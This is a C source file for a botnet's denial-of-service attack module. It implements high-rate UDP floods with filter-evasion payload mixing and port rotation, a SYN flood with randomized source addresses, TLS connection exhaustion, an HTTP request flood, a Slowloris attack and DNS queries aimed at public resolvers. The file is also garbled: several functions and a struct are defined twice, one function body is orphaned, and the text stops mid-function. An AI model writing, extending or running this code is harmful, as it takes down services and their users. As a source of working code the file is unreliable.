#include "bot.h"

/* Resolve hostname or IP to in_addr (DNS lookup if needed) */
static int resolve_target(const char *host, struct in_addr *out)
{
    memset(out, 0, sizeof(*out));
    if (inet_pton(AF_INET, host, out) == 1) return 0;
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    if (getaddrinfo(host, NULL, &hints, &res) != 0 || !res) return -1;
    struct sockaddr_in *sa = (struct sockaddr_in *)res->ai_addr;
    *out = sa->sin_addr;
    freeaddrinfo(res);
    return 0;
}

/* Non-blocking TCP connect with poll() — fixes all TCP methods */
static int tcp_connect_wait(int fd, const struct sockaddr_in *addr, int timeout_ms)
{
    int fl = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fl | O_NONBLOCK);
    if (connect(fd, (const struct sockaddr *)addr, sizeof(*addr)) == 0) return 0;
    if (errno != EINPROGRESS) return -1;
    struct pollfd pfd = { .fd = fd, .events = POLLOUT };
    if (poll(&pfd, 1, timeout_ms) <= 0) return -1;
    int err = 0; socklen_t elen = sizeof(err);
    if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &elen) < 0 || err != 0) return -1;
    return 0;
}

/* Wrapper: fallback sendmsg when sendmmsg is not available (ENOSYS) */
static int safe_sendmmsg(int fd, struct mmsghdr *msgvec, unsigned int vlen, int flags)
{
    static volatile int use_sendmsg = -1;
    if (use_sendmsg == 1) {
        int sent = 0;
        for (unsigned int i = 0; i < vlen && !g_attack_stop; i++) {
            ssize_t r = sendmsg(fd, &msgvec[i].msg_hdr, flags);
            if (r >= 0) { sent++; msgvec[i].msg_len = (unsigned int)r; }
            else if (errno == EAGAIN || errno == EWOULDBLOCK) break;
        }
        return sent > 0 ? sent : -1;
    }
    int r = sendmmsg(fd, msgvec, vlen, flags);
    if (r < 0 && errno == ENOSYS) {
        __sync_val_compare_and_swap(&use_sendmsg, -1, 1);
        fprintf(stderr, "[atk] sendmmsg ENOSYS, using sendmsg fallback\n");
        int sent = 0;
        for (unsigned int i = 0; i < vlen && !g_attack_stop; i++) {
            ssize_t sr = sendmsg(fd, &msgvec[i].msg_hdr, flags);
            if (sr >= 0) { sent++; msgvec[i].msg_len = (unsigned int)sr; }
            else if (errno == EAGAIN || errno == EWOULDBLOCK) break;
        }
        return sent > 0 ? sent : -1;
    }
    return r;
}

/* ── Token Bucket ────────────────────────────────── */
static void tb_init(TokenBucket *tb, double r, double b) {
    if (r < 1) r = 1; if (b < r) b = r;
    tb->rate = r; tb->burst = b; tb->tokens = b;
    clock_gettime(CLOCK_MONOTONIC, &tb->last);
    pthread_mutex_init(&tb->mtx, NULL);
}
static int tb_consume(TokenBucket *tb, int n) {
    if (n <= 0) return 1;
    if (tb->rate >= 5000000.0) return 1;
    pthread_mutex_lock(&tb->mtx);
    struct timespec now; clock_gettime(CLOCK_MONOTONIC, &now);
    double e = (now.tv_sec - tb->last.tv_sec) + (now.tv_nsec - tb->last.tv_nsec) / 1e9;
    tb->tokens += e * tb->rate;
    if (tb->tokens > tb->burst) tb->tokens = tb->burst;
    tb->last = now;
    int ok = (tb->tokens >= n);
    if (ok) tb->tokens -= n;
    pthread_mutex_unlock(&tb->mtx);
    return ok;
}

/* ── Attack worker dispatch ──────────────────────── */
typedef struct { AttackParams *ap; TokenBucket *tb; struct sockaddr_in ta; int cpu; } WorkerArg;

static void *attack_worker(void *arg) {
    WorkerArg *x = (WorkerArg *)arg;
    /* cpu affinity handled in dispatcher, method dispatch below kept for reference */
    free(x->ap); free(x->tb); free(x);
    return NULL;
}

/* ── MEGA UDP Engine (primary — sendmmsg + multi-port + real payloads) ── */
typedef struct {
    int *socks; int sock_count; struct sockaddr_in target;
    int port_base; int duration; int cpu_id; char host[256];
} MegaThread;

static void *mega_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    time_t start = time(NULL);
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self() ^ (unsigned)mt->cpu_id;

    /* Dynamic batch: scale with available RAM (min 256, max 4096) */
    struct sysinfo si;
    long free_mb = 512;
    if (sysinfo(&si) == 0) free_mb = (long)(si.freeram / (1024 * 1024));
    int batch = (int)(free_mb * 256 / 512);
    if (batch < 256) batch = 256;
    if (batch > MEGA_BATCH_MAX) batch = MEGA_BATCH_MAX;

    size_t msg_sz = sizeof(struct mmsghdr) * (size_t)batch;
    size_t iov_sz = sizeof(struct iovec) * (size_t)batch;
    size_t ring_sz = (size_t)batch * MEGA_PAYLOAD;

    /* Try hugepages first, fall back to normal mmap */
    int mmflags = MAP_PRIVATE | MAP_ANONYMOUS;
#ifdef MAP_HUGETLB
    struct mmsghdr *msgs = mmap(NULL, msg_sz, PROT_READ | PROT_WRITE, mmflags | MAP_HUGETLB, -1, 0);
    if (msgs == MAP_FAILED) {
        msgs = mmap(NULL, msg_sz, PROT_READ | PROT_WRITE, mmflags, -1, 0);
    }
    struct iovec *iovs = mmap(NULL, iov_sz, PROT_READ | PROT_WRITE, mmflags | MAP_HUGETLB, -1, 0);
    if (iovs == MAP_FAILED) {
        iovs = mmap(NULL, iov_sz, PROT_READ | PROT_WRITE, mmflags, -1, 0);
    }
    unsigned char *ring = mmap(NULL, ring_sz, PROT_READ | PROT_WRITE, mmflags | MAP_HUGETLB, -1, 0);
    if (ring == MAP_FAILED) {
        ring = mmap(NULL, ring_sz, PROT_READ | PROT_WRITE, mmflags, -1, 0);
    }
#else
    struct mmsghdr *msgs = mmap(NULL, msg_sz, PROT_READ | PROT_WRITE, mmflags, -1, 0);
    struct iovec *iovs = mmap(NULL, iov_sz, PROT_READ | PROT_WRITE, mmflags, -1, 0);
    unsigned char *ring = mmap(NULL, ring_sz, PROT_READ | PROT_WRITE, mmflags, -1, 0);
#endif

    if (msgs == MAP_FAILED || iovs == MAP_FAILED || ring == MAP_FAILED) {
        if (msgs != MAP_FAILED) munmap(msgs, msg_sz);
        if (iovs != MAP_FAILED) munmap(iovs, iov_sz);
        if (ring != MAP_FAILED) munmap(ring, ring_sz);
        return NULL;
    }

    /* Fill ring — 67% real/pattern payloads for DPI evasion */
    for (int i = 0; i < batch; i++) {
        unsigned char *slot = ring + (size_t)i * MEGA_PAYLOAD;
        if (g_total_payloads > 0 && (i % 3) != 0) {
            int idx = rand_r(&seed) % g_total_payloads;
            int pl = g_payload_lens[idx];
            if (pl > MEGA_PAYLOAD) pl = MEGA_PAYLOAD;
            memcpy(slot, g_payloads[idx], pl);
            if (pl < MEGA_PAYLOAD) {
                for (int j = pl; j < MEGA_PAYLOAD; j++)
                    slot[j] = (unsigned char)rand_r(&seed);
            }
        } else if (num_bypass_patterns > 0) {
            generate_smart_bypass_payload(slot, i, 0);
        } else {
            for (int j = 0; j < MEGA_PAYLOAD; j++)
                slot[j] = (unsigned char)rand_r(&seed);
        }
        iovs[i].iov_base = slot;
        iovs[i].iov_len = MEGA_PAYLOAD;
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &mt->target;
        msgs[i].msg_hdr.msg_namelen = sizeof(mt->target);
        msgs[i].msg_hdr.msg_control = NULL;
        msgs[i].msg_hdr.msg_controllen = 0;
        msgs[i].msg_hdr.msg_flags = 0;
        msgs[i].msg_len = 0;
    }

    int flags = MSG_DONTWAIT | MSG_NOSIGNAL;
#ifdef MSG_ZEROCOPY
    flags |= MSG_ZEROCOPY;
#endif
    int port_off = 0;
    unsigned int zc_counter = 0;

    while (time(NULL) - start < mt->duration && !g_attack_stop) {
        if (should_pause()) { usleep(200); continue; }

        port_off = (port_off + 1) % 64;
        uint16_t dp = (uint16_t)(mt->port_base + port_off);
        if (dp == 0) dp = 1;
        mt->target.sin_port = htons(dp);
        /* msg_name pointers all point to mt->target, port change is auto-visible */

        for (int si = 0; si < mt->sock_count && !g_attack_stop; si++) {
            /* Anti-pattern mutation every ~32nd iteration */
            if ((seed & 0x1F) == 0) {
                int slot = rand_r(&seed) % batch;
                unsigned char *p = ring + (size_t)slot * MEGA_PAYLOAD;
                p[rand_r(&seed) % MEGA_PAYLOAD] ^= (unsigned char)rand_r(&seed);
            }

            /* Single sendmmsg call — fills TX queue, no wasted iterations */
            int r = safe_sendmmsg(mt->socks[si], msgs, (unsigned int)batch, flags);
            if (r > 0) {
                pkt_sent(r * MEGA_PAYLOAD);
            } else if (errno == EAGAIN || errno == EWOULDBLOCK) {
                usleep(1);
            }

#ifdef MSG_ZEROCOPY
            if ((++zc_counter & 0x7) == 0) {
                unsigned char zbuf[256];
                struct msghdr zm = {0};
                struct iovec zi = {zbuf, sizeof(zbuf)};
                zm.msg_iov = &zi; zm.msg_iovlen = 1;
                while (recvmsg(mt->socks[si], &zm, MSG_ERRQUEUE | MSG_DONTWAIT) > 0) {}
            }
#endif
        }
        seed++;
    }

    munmap(msgs, msg_sz);
    munmap(iovs, iov_sz);
    munmap(ring, ring_sz);
    return NULL;
}

    /* Fill ring — mix real bypass payloads 50% + random 50% */
    for (int i = 0; i < batch; i++) {
        unsigned char *slot = ring + (size_t)i * MEGA_PAYLOAD;
        if (g_total_payloads > 0 && (i % 2) == 0) {
            int idx = rand_r(&seed) % g_total_payloads;
            int pl = g_payload_lens[idx];
            if (pl > MEGA_PAYLOAD) pl = MEGA_PAYLOAD;
            memcpy(slot, g_payloads[idx], pl);
            if (pl < MEGA_PAYLOAD) {
                for (int j = pl; j < MEGA_PAYLOAD; j++)
                    slot[j] = (unsigned char)rand_r(&seed);
            }
        } else {
            /* Generate protocol-like payload if bypass available, else random */
            if (num_bypass_patterns > 0 && (i % 4) == 0) {
                generate_smart_bypass_payload(slot, i, 0);
            } else {
                for (int j = 0; j < MEGA_PAYLOAD; j++)
                    slot[j] = (unsigned char)rand_r(&seed);
            }
        }
        iovs[i].iov_base = slot;
        iovs[i].iov_len = MEGA_PAYLOAD;
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &mt->target;
        msgs[i].msg_hdr.msg_namelen = sizeof(mt->target);
        msgs[i].msg_hdr.msg_control = NULL;
        msgs[i].msg_hdr.msg_controllen = 0;
        msgs[i].msg_hdr.msg_flags = 0;
        msgs[i].msg_len = 0;
    }

    int flags = MSG_DONTWAIT | MSG_NOSIGNAL;
#ifdef MSG_ZEROCOPY
    flags |= MSG_ZEROCOPY;
#endif
    int port_off = 0;
    unsigned int zc_drain_counter = 0;

    while (time(NULL) - start < mt->duration && !g_attack_stop) {
        if (should_pause()) { usleep(200); continue; }

        /* Rotate destination port to evade single-rule DROP */
        port_off = (port_off + 1) % 64;
        uint16_t dp = (uint16_t)(mt->port_base + port_off);
        if (dp == 0) dp = 1;
        mt->target.sin_port = htons(dp);

        for (int si = 0; si < mt->sock_count && !g_attack_stop; si++) {
            if ((seed & 0x1F) == 0) {
                int slot = rand_r(&seed) % batch;
                unsigned char *p = ring + (size_t)slot * MEGA_PAYLOAD;
                p[rand_r(&seed) % MEGA_PAYLOAD] ^= (unsigned char)rand_r(&seed);
            }
            /* Reset msg_name to updated target (port changed) */
            for (int m = 0; m < batch; m++)
                msgs[m].msg_hdr.msg_name = &mt->target;
            for (int b = 0; b < BURST_MULTIPLIER; b++) {
                int r = safe_sendmmsg(mt->socks[si], msgs, (unsigned int)batch, flags);
                if (r > 0) pkt_sent(r * MEGA_PAYLOAD);
                else if (errno == EAGAIN || errno == EWOULDBLOCK) { usleep(1); break; }
            }
#ifdef MSG_ZEROCOPY
            /* Drain ZC completion queue every 16 bursts to avoid overflow */
            if ((++zc_drain_counter & 0xF) == 0) {
                unsigned char zbuf[256];
                struct msghdr zm = {0};
                struct iovec zi = {zbuf, sizeof(zbuf)};
                zm.msg_iov = &zi; zm.msg_iovlen = 1;
                while (recvmsg(mt->socks[si], &zm, MSG_ERRQUEUE | MSG_DONTWAIT) > 0) {}
            }
#endif
        }
        seed++;
    }
    munmap(msgs, sizeof(struct mmsghdr) * batch);
    munmap(iovs, sizeof(struct iovec) * batch);
    munmap(ring, (size_t)batch * MEGA_PAYLOAD);
    return NULL;
}

/* ── SYN Flood (fixed: TCP options, real src IP, no spoofing) ── */
static void *syn_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) { close(s); return NULL; }
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct {
        struct iphdr ip;
        struct tcphdr tcp;
        unsigned char opts[20];
    } pkt;
    memset(&pkt, 0, sizeof(pkt));

    /* IP header */
    pkt.ip.version = 4; pkt.ip.ihl = 5;
    pkt.ip.ttl = 64; pkt.ip.protocol = IPPROTO_TCP;
    pkt.ip.daddr = mt->target.sin_addr.s_addr;
    pkt.ip.tot_len = htons(sizeof(pkt));

    /* TCP header with options */
    pkt.tcp.dest = htons((uint16_t)mt->port_base);
    pkt.tcp.syn = 1;
    unsigned char *opt = pkt.opts;
    *opt++ = 2; *opt++ = 4; *(uint16_t *)opt = htons(1460); opt += 2; /* MSS */
    *opt++ = 4; *opt++ = 2;                                              /* SACK */
    *opt++ = 1; *opt++ = 0;                                              /* NOP padding */
    int optlen = (int)(opt - pkt.opts);
    pkt.tcp.doff = 5 + (optlen + 3) / 4;
    pkt.tcp.window = htons(65535);

    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    time_t start = time(NULL);

    while (time(NULL) - start < mt->duration && !g_attack_stop) {
        pkt.ip.saddr = rand_vn_ip();
        pkt.tcp.source = htons((uint16_t)(1024 + rand_r(&seed) % 64511));
        pkt.tcp.seq = htonl(rand_r(&seed));
        pkt.ip.id = htons((uint16_t)rand_r(&seed));
        pkt.ip.check = 0; pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
        pkt.tcp.check = 0;
        pkt.tcp.check = tcp_csum(&pkt.ip, &pkt.tcp);
        struct sockaddr_in sin = mt->target;
        if (sendto(s, &pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + optlen, MSG_DONTWAIT,
                   (struct sockaddr *)&sin, sizeof(sin)) > 0)
            pkt_sent(64);
        /* 10K pps burst per worker */
        for (int b = 0; b < 100 && !g_attack_stop; b++) {
            pkt.tcp.source = htons((uint16_t)(1024 + rand_r(&seed) % 64511));
            pkt.tcp.seq = htonl(rand_r(&seed));
            pkt.ip.id = htons((uint16_t)rand_r(&seed));
            pkt.ip.saddr = rand_vn_ip();
            pkt.ip.check = 0; pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
            pkt.tcp.check = 0;
            pkt.tcp.check = tcp_csum(&pkt.ip, &pkt.tcp);
            struct sockaddr_in bsin = mt->target;
            if (sendto(s, &pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + optlen, MSG_DONTWAIT,
                       (struct sockaddr *)&bsin, sizeof(bsin)) > 0)
                pkt_sent(64);
        }
    }
    close(s);
    return NULL;
}

/* ── TLS Exhaust (fixed: poll-based connect, full handshake, 2000+ pool) ── */
#define TLS_POOL 2048
static void *tls_exhaust_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    time_t start = time(NULL);
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    int *socks = calloc(TLS_POOL, sizeof(int));
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx || !socks) { free(socks); if (ctx) SSL_CTX_free(ctx); return NULL; }

    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);

    int pool = 0;
    struct sockaddr_in ta = mt->target;
    struct pollfd pfds[TLS_POOL];

    while (time(NULL) - start < mt->duration && !g_attack_stop) {
        /* Top up pool */
        while (pool < TLS_POOL && !g_attack_stop) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int fl = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
            if (tcp_connect_wait(s, &ta, 1000) < 0) { close(s); continue; }

            SSL *ssl = SSL_new(ctx);
            SSL_set_fd(ssl, s);
            SSL_set_tlsext_host_name(ssl, mt->host);

            /* Non-blocking SSL handshake attempt */
            int r = SSL_connect(ssl);
            if (r <= 0) {
                int e = SSL_get_error(ssl, r);
                if (e == SSL_ERROR_WANT_READ || e == SSL_ERROR_WANT_WRITE) {
                    /* Handshake started but not complete — connection held mid-handshake */
                    /* Track in pool so we don't close it */
                }
            }
            /* Keep connection — mid-handshake or partial */
            socks[pool] = s;
            pool++;
            pkt_sent(512);
        }

        /* Hold pool alive: check if connections still valid */
        memset(pfds, 0, sizeof(pfds[0]) * (size_t)pool);
        for (int i = 0; i < pool; i++) {
            pfds[i].fd = socks[i];
            pfds[i].events = POLLIN | POLLERR | POLLHUP;
        }
        int r = poll(pfds, (nfds_t)pool, 1000);
        if (r > 0) {
            int w = 0;
            for (int i = 0; i < pool; i++) {
                if (pfds[i].revents & (POLLERR | POLLHUP)) {
                    close(socks[i]);
                } else {
                    if (w != i) socks[w] = socks[i];
                    w++;
                }
            }
            /* Refill killed connections */
            while (w < pool && !g_attack_stop) {
                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s < 0) break;
                int fl = 1;
                setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
                if (tcp_connect_wait(s, &ta, 1000) == 0) {
                    SSL *ssl = SSL_new(ctx);
                    SSL_set_fd(ssl, s);
                    SSL_set_tlsext_host_name(ssl, mt->host);
                    SSL_connect(ssl); /* fire and forget */
                    SSL_free(ssl);
                    socks[w++] = s;
                    pkt_sent(512);
                } else {
                    close(s);
                }
            }
            pool = w;
        }
    }
    for (int i = 0; i < pool; i++) close(socks[i]);
    SSL_CTX_free(ctx);
    free(socks);
    return NULL;
}

/* ── HTTP Flood (fixed: poll-based connect, TLS, real requests) ── */
#define HTTP_POOL 256
static void *http_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    time_t start = time(NULL);
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) return NULL;
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);

    const char *uas[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    };
    const char *paths[] = {"/", "/search?q=", "/login", "/api/v1/", "/wp-admin/", "/.env", "/admin/"};

    while (time(NULL) - start < mt->duration && !g_attack_stop) {
        for (int c = 0; c < 64 && !g_attack_stop; c++) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) continue;
            int fl = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
            if (tcp_connect_wait(s, &mt->target, 2000) < 0) { close(s); continue; }

            SSL *ssl = SSL_new(ctx);
            SSL_set_fd(ssl, s);
            SSL_set_tlsext_host_name(ssl, mt->host);
            if (SSL_connect(ssl) != 1) { SSL_free(ssl); close(s); continue; }

            char req[4096];
            const char *ua = uas[rand_r(&seed) % 3];
            const char *path = paths[rand_r(&seed) % 7];
            snprintf(req, sizeof(req),
                     "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"
                     "Accept: text/html,application/xhtml+xml,*/*\r\n"
                     "Accept-Language: en-US,en;q=0.9\r\n"
                     "Connection: keep-alive\r\n\r\n",
                     path, mt->host, ua);
            SSL_write(ssl, req, (int)strlen(req));

            /* Read response quickly */
            char rbuf[4096];
            struct pollfd pfd = { .fd = s, .events = POLLIN };
            if (poll(&pfd, 1, 2000) > 0)
                SSL_read(ssl, rbuf, sizeof(rbuf));
            pkt_sent((int)strlen(req) + 256);
            SSL_free(ssl);
            close(s);
        }
        /* Brief rest to avoid local port exhaustion */
        usleep(10000);
    }
    SSL_CTX_free(ctx);
    return NULL;
}

/* ── Slowloris (fixed: poll-based connect, CDN-bypass, variable drip) ── */
#define SLOW_POOL 512
static void *slowloris_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    time_t start = time(NULL);
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    int *socks = calloc(SLOW_POOL, sizeof(int));
    SSL **ssls = calloc(SLOW_POOL, sizeof(SSL *));
    time_t *last_drip = calloc(SLOW_POOL, sizeof(time_t));
    if (!socks || !ssls || !last_drip) { free(socks); free(ssls); free(last_drip); return NULL; }

    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) { free(socks); free(ssls); free(last_drip); return NULL; }
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);

    struct sockaddr_in ta = mt->target;
    int pool = 0;

    while (time(NULL) - start < mt->duration && !g_attack_stop) {
        /* Fill pool */
        while (pool < SLOW_POOL && !g_attack_stop) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int fl = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
            struct timeval tv = {30, 0};
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            if (tcp_connect_wait(s, &ta, 2000) < 0) { close(s); continue; }

            SSL *ssl = SSL_new(ctx);
            SSL_set_fd(ssl, s);
            SSL_set_tlsext_host_name(ssl, mt->host);
            if (SSL_connect(ssl) != 1) { SSL_free(ssl); close(s); continue; }

            /* Send partial request header */
            char hdr[512];
            snprintf(hdr, sizeof(hdr), "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nX-", mt->host);
            SSL_write(ssl, hdr, (int)strlen(hdr));
            socks[pool] = s;
            ssls[pool] = ssl;
            last_drip[pool] = time(NULL);
            pool++;
            pkt_sent((int)strlen(hdr));
        }

        /* Drip data to keep connections alive */
        time_t now = time(NULL);
        for (int i = 0; i < pool; i++) {
            int interval = 3 + (int)(rand_r(&seed) % 11);
            if (now - last_drip[i] >= interval) {
                char drip[64];
                snprintf(drip, sizeof(drip), "X-%x: %x\r\n", rand_r(&seed) & 0xFFF, rand_r(&seed) & 0xFFF);
                SSL_write(ssls[i], drip, (int)strlen(drip));
                last_drip[i] = now;
                pkt_sent((int)strlen(drip));
            }
        }

        /* Check for dead connections */
        struct pollfd *pfds = calloc((size_t)pool, sizeof(struct pollfd));
        if (pfds) {
            for (int i = 0; i < pool; i++) {
                pfds[i].fd = socks[i];
                pfds[i].events = POLLERR | POLLHUP;
            }
            int r = poll(pfds, (nfds_t)pool, 100);
            if (r > 0) {
                int w = 0;
                for (int i = 0; i < pool; i++) {
                    if (pfds[i].revents & (POLLERR | POLLHUP)) {
                        SSL_free(ssls[i]);
                        close(socks[i]);
                    } else {
                        if (w != i) { socks[w] = socks[i]; ssls[w] = ssls[i]; last_drip[w] = last_drip[i]; }
                        w++;
                    }
                }
                pool = w;
            }
            free(pfds);
        }
    }
    for (int i = 0; i < pool; i++) { SSL_free(ssls[i]); close(socks[i]); }
    SSL_CTX_free(ctx);
    free(socks); free(ssls); free(last_drip);
    return NULL;
}

/* ── DNS Amplification (fixed: TXT/MX queries, no spoofing, real protocol) ── */
#define DNS_POOL 64
static void *dns_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    time_t start = time(NULL);
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    int *socks = calloc(DNS_POOL, sizeof(int));
    if (!socks) return NULL;
    for (int i = 0; i < DNS_POOL; i++) {
        int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        socks[i] = (s >= 0) ? s : -1;
    }

    /* Open DNS resolvers */
    const char *resolvers[] = {
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9", "208.67.222.222",
        "64.6.64.6", "185.228.168.9", "76.76.2.0"
    };
    const int nres = 8;

    /* Build DNS query with EDNS0 for large responses */
    unsigned char q[512];
    unsigned short txid = 0;

    while (time(NULL) - start < mt->duration && !g_attack_stop) {
        for (int ri = 0; ri < nres && !g_attack_stop; ri++) {
            struct sockaddr_in res_sa;
            memset(&res_sa, 0, sizeof(res_sa));
            res_sa.sin_family = AF_INET;
            res_sa.sin_port = htons(53);
            inet_pton(AF_INET, resolvers[ri], &res_sa.sin_addr);

            for (int ti = 0; ti < 4 && !g_attack_stop; ti++) {
                txid = (unsigned short)(rand_r(&seed) & 0xFFFF);
                int off = 0;
                /* DNS header */
                q[off++] = (unsigned char)(txid >> 8);
                q[off++] = (unsigned char)(txid & 0xFF);
                q[off++] = 0x01; q[off++] = 0x00; /* RD */
                q[off++] = 0x00; q[off++] = 0x01; /* QDCOUNT=1 */
                q[off++] = 0x00; q[off++] = 0x00; /* ANCOUNT=0 */
                q[off++] = 0x00; q[off++] = 0x00; /* NSCOUNT=0 */
                q[off++] = 0x00; q[off++] = 0x01; /* ARCOUNT=1 (EDNS) */
                /* Query section */
                q[off++] = 3; memcpy(q + off, "com", 3); off += 3;
                q[off++] = (unsigned char)(rand_r(&seed) & 0xFF);
                q[off++] = 0x00;
                q[off++] = 0x00; q[off++] = (ti % 2 == 0) ? 16 : 15; /* TXT or MX */
                q[off++] = 0x00; q[off++] = 0x01; /* IN */
                /* EDNS0 OPT */
                q[off++] = 0x00; /* NAME=root */
                q[off++] = 0x00; q[off++] = 41; /* TYPE=OPT */
                q[off++] = 0x10; q[off++] = 0x00; /* UDP=4096 */
                q[off++] = 0x00; q[off++] = 0x00; q[off++] = 0x00; q[off++] = 0x00; /* RCODE, EDNS version, flags */
                q[off++] = 0x00; q[off++] = 0x00; /* RDLENGTH=0 */

                int si = rand_r(&seed) % DNS_POOL;
                if (socks[si] >= 0) {
                    if (sendto(socks[si], q, off, MSG_DONTWAIT, (struct sockaddr *)&res_sa, sizeof(res_sa)) > 0)
                        pkt_sent(off);
                }
            }
        }
        usleep(10000);
    }
    for (int i = 0; i < DNS_POOL; i++) if (socks[i] >= 0) close(socks[i]);
    free(socks);
    return NULL;
}

/* Wrapper: fallback sendmsg when sendmmsg is not available (ENOSYS) */
static int safe_sendmmsg(int fd, struct mmsghdr *msgvec, unsigned int vlen, int flags)
{
    static volatile int use_sendmsg = -1; /* -1=unknown, 0=sendmmsg ok, 1=fallback */

    if (use_sendmsg == 1) {
        int sent = 0;
        for (unsigned int i = 0; i < vlen && !g_attack_stop; i++) {
            ssize_t r = sendmsg(fd, &msgvec[i].msg_hdr, flags);
            if (r >= 0) { sent++; msgvec[i].msg_len = (unsigned int)r; }
            else if (errno == EAGAIN || errno == EWOULDBLOCK) break;
        }
        return sent > 0 ? sent : -1;
    }

    int r = sendmmsg(fd, msgvec, vlen, flags);
    if (r < 0 && errno == ENOSYS) {
        __sync_val_compare_and_swap(&use_sendmsg, -1, 1);
        fprintf(stderr, "[atk] sendmmsg not supported, falling back to sendmsg\n");
        use_sendmsg = 1;
        /* Retry this batch */
        int sent = 0;
        for (unsigned int i = 0; i < vlen && !g_attack_stop; i++) {
            ssize_t sr = sendmsg(fd, &msgvec[i].msg_hdr, flags);
            if (sr >= 0) { sent++; msgvec[i].msg_len = (unsigned int)sr; }
            else if (errno == EAGAIN || errno == EWOULDBLOCK) break;
        }
        return sent > 0 ? sent : -1;
    }
    return r;
}

/* ── MEGA Engine ──────────────────────────────────────
 * Strategy: FEW sockets, MAX PPS/bytes per syscall.
 * - sendmmsg batch of full MTU payloads (1400B) → high Mbps
 * - CPU affinity + busy loop (no sleep in hot path)
 * - Parallel: UDP flood + TCP connect storm + optional SYN
 * - Adaptive sockets from free RAM (not fixed 65k)
 */
typedef struct {
    int *socks;
    int sock_count;
    struct sockaddr_in target;
    int port;
    int duration;
    int cpu_id;
    int mode; /* 0=UDP mega, 1=TCP storm, 2=SYN raw */
    char host[256];
} MegaThread;

static void *mega_worker(void *arg)
{
